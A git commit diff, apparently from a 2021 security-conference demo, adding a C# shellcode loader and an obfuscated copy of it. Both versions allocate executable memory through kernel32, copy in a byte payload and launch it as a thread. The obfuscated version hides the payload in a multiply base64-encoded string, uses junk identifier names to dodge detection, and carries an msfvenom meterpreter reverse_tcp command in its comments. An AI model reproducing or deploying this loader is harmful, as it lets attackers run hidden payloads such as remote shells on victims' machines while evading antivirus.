20fa46bb3fd3b21a1bfca503ae60a8c1f653770d
dead-jaskier <symon3@protonmail.com>
2021-10-20 22:52:31 -0500

    Added Original file and finished obfuscation

---
+++ ozsec2021_shellcode/Original.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+
+namespace ozsec2021_shellcode
+{
+    class Original
+    {
+        // Set the memory to commit and rx 
+        private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        // create VirtualAlloc(), CreateThread() and WaitForSingleObject() references through DLLImport of 'kernel32' package
+        [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId
+            );
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );
+        // everything in Main() will fire code at launch
+        public static void BadMain(string[] args)
+        {
+            // create and set the shellcode byte[] and feed it byte[] of shellcode or other payloads: Generated via msfvenom
+            // Ex: msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
+            byte[] shellcode = new byte[] { /* Shellcode byte[] here. Ex ' 0x00,0x0F,0x0c ' */ };
+            // Allocate the virtual memory and copy in shell code, address and length
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+            // set the pointer of thread
+            IntPtr hThread = IntPtr.Zero;
+            // hold thread's id
+            UInt32 threadId = 0;
+            // store process info point
+            IntPtr pinfo = IntPtr.Zero;
+            // Create the thread - Passing in TheadAttributes, Stack Size, Address, process info, creation flags and thread Id
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+
+            Console.WriteLine($"Press anything to exit ...");
+            Console.ReadKey();
+        }
+    }
+}
--- ozsec2021_shellcode/Program.cs
+++ ozsec2021_shellcode/Program.cs
@@ -1,14 +1,89 @@
 ﻿using System;
-using System.Data;
-using System.Diagnostics;
+using Ihonestlycouldntthinkofabetteralias = System.Runtime.InteropServices;
+using System.Collections.Generic;
 
-namespace ozsec2021_shellcode
+namespace koby
 {
     class Program
     {
-        static void Main(string[] args)
+        public class Jaskier
         {
-            Console.WriteLine("Hello World!");
+            private static string thisisthethingthatisgonnagivemecontrol = "VFVob2JGbHBkM2RsUkVsNlRFUkNORTVYU1hOTlNHYzBUMU4zZDJWSFVtMU1SRUkwV1dwQmMwMUlaekphVTNkM1pVZGFha3hFUWpSWlYxVnpUVWhuTTA1VGQzZGxSMXByVEVSQ05FOUVhM05OU0dodFQxTjNkMlZFWnpWTVJFSTBXa2RWYzAxSVp6UlpVM2QzWlVSQk1reEVRalJOZWtGelRVaG5kMDU1ZDNkbFJGRXpURVJDTkU1cVdYTk5TR2MwVFZOM2QyVkVUbTFNUkVJMFRYcFZjMDFJWnpOUFUzZDNaVVJqTUV4RVFqUk5SR2R6VFVobk1FNXBkM2RsUkdkM1RFUkNORTB5VlhOTlNHY3lXbE4zZDJWRVl6Rk1SRUkwV2xkVmMwMUlhR3haYVhkM1pVZFdhRXhFUWpSYWJWbHpUVWhvYkUxVGQzZGxSMVUwVEVSQ05GcEVaM05OU0dodFdtbDNkMlZIV20xTVJFSTBXbTFaYzAxSVozaE5lWGQzWlVSYWJFeEVRalJhVjFselRVaG9iVmxwZDNkbFJHeHFURVJDTkUxVVRYTk5TR2Q0VFhsM2QyVkVSWHBNUkVJMFRucE5jMDFJWnpWWlUzZDNaVWRaTWt4RVFqUk5ha2x6VFVob2FrMVRkM2RsUkdNelRFUkNORTlVWjNOTlNHY3dUVk4zZDJWRVNYcE1SRUkwVDFSbmMwMUlaekJOVTNkM1pVUkdiVXhFUWpSUFZHZHpUVWhuTUUxVGQzZGxSRUV6VEVSQ05FMVhUWE5OU0dob1RrTjNkMlZFVlRWTVJFSTBUWHBWYzAxSVp6VlBRM2QzWlVSWmVFeEVRalJOTWtselRVaG5lVTFwZDNkbFIxWnFURVJDTkUxcVNYTk5TR2hyVFhsM2QyVkhTbTFNUkVJMFRXMVpjMDFJWnpOTmFYZDNaVVJhYlV4RVFqUk5WRVZ6VFVobmVscHBkM2RsUkUxNlRFUkNORnBFU1hOTlNHaHJXWGwzZDJWRVJteE1SRUkwVFZSSmMwMUlhR3RPUTNkM1pVUldhRXhFUWpST2FsbHpUVWhvYlZsNWQzZGxSRkY0VEVSQ05FNUVVWE5OU0djMVQwTjNkMlZFVVhoTVJFSTBUVVJOYzAxSVp6VlBRM2QzWlVSVmVFeEVRalJOYlZselRVaG5lRTFwZDNkbFIwMTZURVJDTkU5VVozTk5TR2N4VFhsM2QyVkVXbWxNUkVJMFQxUlpjMDFJYUd0TmVYZDNaVVJaTTB4RVFqUk9WMWx6VFVobmVFMXBkM2RsUjAxNlRFUkNORTlVWjNOTlNHY3dXV2wzZDJWRVRYcE1SRUkwVFZSSmMwMUlhR3BOUTNkM1pVUnJORXhFUWpST1YwbHpUVWhuZDFscGQzZGxSRkY2VEVSQ05FOVVXWE5OU0docldWTjNkMlZFV1ROTVJFSTBUVzFaYzAxSVp6RlpVM2QzWlVSSmVVeEVRalJhVjAxelRVaG5OVTlEZDNkbFJFa3pURVJDTkU5VVozTk5TR2Q0VFdsM2QyVkhUVEZNUkVJMFRXcEpjMDFJYUd0TmVYZDNaVWRLYlV4RVFqUmFSRWx6VFVob2ExbDVkM2RsUkVac1RFUkNORTFVU1hOTlNHaHJUa04zZDJWRVNtbE1SRUkwV21wTmMwMUlaekpPYVhkM1pVZFZNMHhFUWpSTlZFRnpUVWhuTWxwVGQzZGxSMVpwVEVSQ05FMXFaM05OU0djeVdsTjNkMlZFVFROTVJFSTBUbXBaYzAxSWFHMU5lWGQzWlVSU2FVeEVRalJQVkdkelRVaG5NRmxwZDNkbFJFMHpURVJDTkUxVVNYTk5TR2hxVFVOM2QyVkVZekZNUkVJMFQxUm5jMDFJWjNoYWFYZDNaVVJWTkV4RVFqUlBWR2R6VFVobk1GbHBkM2RsUkVKdFRFUkNORTFVU1hOTlNHaHFUVU4zZDJWRWF6Uk1SRUkwVFZSamMwMUlaelZQUTNkM1pVUkZlVXhFUWpSWmVrMXpUVWhuTlZsVGQzZGxSRlV6VEVSQ05FMTZZM05OU0dkNlRubDNkMlZFVVRSTVJFSTBUa1JuYzAxSVp6Tk5hWGQzWlVSU2FFeEVRalJPUkd0elRVaG5NRTFwZDNkbFIxWnFURVJDTkZwcVRYTk5TR2N3V1dsM2QyVkVVbXBNUkVJMFRrUnJjMDFJWnpWUFEzZDNaVVJCZUV4RVFqUmFiVVZ6VFVobk5VMTVkM2RsUjFacVRFUkNORnBYVFhOTlNHaHNXWGwzZDJWRVVteE1SRUkwVGpKSmMwMUlaM2xOUTNkM1pVUkplRXhFUWpSTlZFMXpUVWhuZUUxNWQzZGxSR1JwVEVSQ05FNXFVWE5OU0djeVRVTjNkMlZFU1hoTVJFSTBUa2ROYzAxSVp6Qk9lWGQzWlVSa2FVeEVRalJPVjFselRVaG5NazVEZDNkbFJFMHhURVJDTkUxVVVYTk5TR2MxV1ZOM2QyVkhXbWxNUkVJMFdsZE5jMDFJYUdwTmVYZDNaVWRHYVV4RVFqUlBSRTF6VFVobmVFMXBkM2RsUkVWNlRFUkNORTFVVFhOTlNHZDZXVk4zZDJWSFVUTk1SRUkwVGtSamMwMUlaekJOZVhkM1pVUmthVXhFUWpSTk1rVnpUVWhuTlUxNWQzZGxSR00wVEVSQ05FMVVUWE5OU0doc1dYbDNkMlZIVFRKTVJFSTBUbnByYzAxSVozaFBVM2QzWlVSa2FVeEVRalJhUkUxelRVaG9hVmxwZDNkbFJFVjVURVJDTkU1WFNYTk5TR2N6V1dsM2QyVkVSWGhNUkVJMFRWUk5jMDFJWjNoT2FYZDNaVVJLYUV4RVFqUlBWMFZ6VFVob2JVNVRkM2RsUkZGNlRFUkNORTVFVFhOTlNHY3dUWGwzZDJWRVVYcE1SRUkwVGxSTmMwMUlaekJOZVhkM1pVUlZla3hFUWpST1JFMXpUVWhuTTFscGQzZGxSMWsxVEVSQ05FMVhUWE5OU0docVdYbDNkMlZIV1hwTVJFSTBXbGROYzAxSWFHcE9hWGQzWlVSbk1FeEVRalJPZW10elRVaG5kMDE1ZDNkbFJGRXhURVJDTkU1RVVYTk5TR2N6V1dsM2QyVkVhR2hNUkVJMFdXcFpjMDFJWnpKT2VYZDNaVVJqZVV4RVFqUmFWMDF6VFVob2FrNXBkM2RsUkdzeVRFUkNORnBFVFhOTlNHY3lUbmwzZDJWRVJUVk1SRUkwV2xkTmMwMUlaekZhUTNkM1pVUkdhVXhFUWpST2FsbHpUVWhvYlZwcGQzZGxSMXBwVEVSQ05FNTZVWE5OU0dkNFRYbDNkMlZFUlhwTVJFSTBUVlJOYzAxSVp6TlBVM2QzWlVSRmVreEVRalJPZW10elRVaG5lRTU1ZDNkbFJGRXhURVJDTkU1RVVYTk5TR2N6V1dsM2QyVkVSWGhNUkVJMFdUSkZjMDFJYUd0WmFYZDNaVVJTYWt4RVFqUmFWMDF6VFVob2FrNXBkM2RsUkd0M1RFUkNORnBYU1hOTlNHZDRUWGwzZDJWRVdtdE1SRUkwVFdwVmMwMUlaelZQUTNkM1pVUkpNVXhFUWpST2VtdHpUVWhuTVUxNWQzZGxSR1JwVEVSQ05FMVVUWE5OU0dkM1RYbDNkMlZFUlhwTVJFSTBUVlJOYzAxSVp6Qk9VM2QzWlVSak5VeEVRalJOVkUxelRVaG5NMWxwZDNkbFJGSnBURVJDTkZscVkzTk5TR2N3VFVOM2QyVkhXVEpNUkVJMFdsZE5jMDFJYUdwT2FYZDNaVVJuZDB4RVFqUk9SRUZ6VFVobk0wOVRkM2RsUkVWNlRFUkNORTVFVlhOTlNHY3dUVU4zZDJWRVVUQk1SRUkwVGpKSmMwMUlaM2hOVTNkM1pVZE9hRXhFUWpSYVIwbHpUVWhuTUZsNWQzZGxSMVpxVEVSQ05GbDZXWE5OU0djMVRVTjNkMlZIVm1sTVJFSTBUVlJOYzAxSVp6SmFVM2QzWlVST2FVeEVRalJPUjBselRVaG5NMWxwZDNkbFJFVjZURVJDTkU1VVRYTk5TR2Q0VFhsM2QyVkVSWHBNUkVJMFRucHJjMDFJWjNoTmVYZDNaVVJSZWt4RVFqUk9Na2x6VFVobmVFOURkM2RsUkU1cVRFUkNORTFYVFhOTlNHZDVUWGwzZDJWSFZtcE1SRUkwV1hwWmMwMUlaekJPUTNkM1pVUmthVXhFUWpST2FsbHpUVWhuTTFwRGQzZGxSRlpzVEVSQ05FNTZTWE5OU0doc1dYbDNkMlZIVFRKTVJFSTBUa2RSYzAxSVp6QmFRM2QzWlVkV2FreEVRalJOVjFselRVaG5lazU1ZDNkbFJFWnFURVJDTkU5VVdYTk5TR2N5VFhsM2QyVkhWbXBNUkVJMFdsZE5jMDFJYUd4WmVYZDNaVWRhYUV4RVFqUlBSR2R6VFVob2JGbDVkM2RsUjFacVRFUkNORnBYVFhOTlNHZDRUV2wzZDJWSFVYZE1SRUkwVFRKRmMwMUlhR3RPVTNkM1pVUlpNa3hFUWpSYVJFbHpUVWhvYTAxRGQzZGxSMFUwVEVSQ05GcFVUWE5OU0dob1RtbDNkMlZIU1hoTVJFSTBUa1JWYzAxSVp6TlBVM2QzWlVSRmVreEVRalJPUkVGelRVaG9iRmw1ZDNkbFIwMHlURVJDTkUxNlZYTk5TR2N6VDFF==";
+            private static List<byte> shogun = new List<byte>() { 0x00 };
+            
+            // Set the memory to commit and rx 
+            private static UInt32 MEM_COMMIT = 0x1000;
+            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+            // create VirtualAlloc(), CreateThread() and WaitForSingleObject() references through DLLImport of 'kernel32' package
+            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lump,
+                    UInt32 lard, UInt32 fiction, UInt32 magic);
+            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            private static extern IntPtr CreateThread(
+                UInt32 cucumber,
+                UInt32 october,
+                UInt32 nevergonnagiveyouup,
+                IntPtr gotcha,
+                UInt32 weeb,
+                ref UInt32 toaster
+                );
+            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(
+                IntPtr kansas,
+                UInt32 nectar
+                );
+            // everything in Main() will fire code at launch
+            public static void Main(string[] args)
+            {
+                // Can't use bass64 to get command
+                // - Make it so you get command
+                cantremembermydreams();
+
+                // create and set the shellcode byte[] and feed it byte[] of shellcode or other payloads: Generated via msfvenom
+                // Ex: msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
+                byte[] buzzLightyear = shogun.ToArray();
+                // Allocate the virtual memory and copy in shell code, address and length
+                UInt32 funkydunky;
+                funkydunky = VirtualAlloc(0, (UInt32)buzzLightyear.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                Ihonestlycouldntthinkofabetteralias.Marshal.Copy(buzzLightyear, 0, (IntPtr)funkydunky, buzzLightyear.Length);
+                // set the pointer of thread
+                IntPtr givehead = IntPtr.Zero;
+                // hold thread's id
+                UInt32 poptart = 0;
+                // store process info point
+                IntPtr cannabanna = IntPtr.Zero;
+                // Create the thread - Passing in TheadAttributes, Stack Size, Address, process info, creation flags and thread Id
+                givehead = CreateThread(0, 0, funkydunky, cannabanna, 0, ref poptart);
+                WaitForSingleObject(givehead, 0xFFFFFFFF);
+            }
+
+            private static void cantremembermydreams()
+            {
+                string[] goku = thisisthethingthatisgonnagivemecontrol.Split(',');
+                string vegeta;
+                do
+                {
+                    vegeta = tellmomimsorry(goku[0]);
+                    goku = vegeta.Split(',');
+                } while (goku.Length == 1);
+
+                shogun.Clear();
+                foreach (string gohan in goku)
+                {
+                    shogun.Add(Convert.ToByte(gohan));
+                }
+                
+                foreach(byte b in shogun)
+                {
+                    Console.Write(b.ToString());
+                }    
+            }
+
+            private static string tellmomimsorry(string janetjackson)
+            {
+                var donttelldadthough = System.Convert.FromBase64String(janetjackson);
+                return System.Text.Encoding.UTF8.GetString(donttelldadthough);
+            }
         }
     }
 }
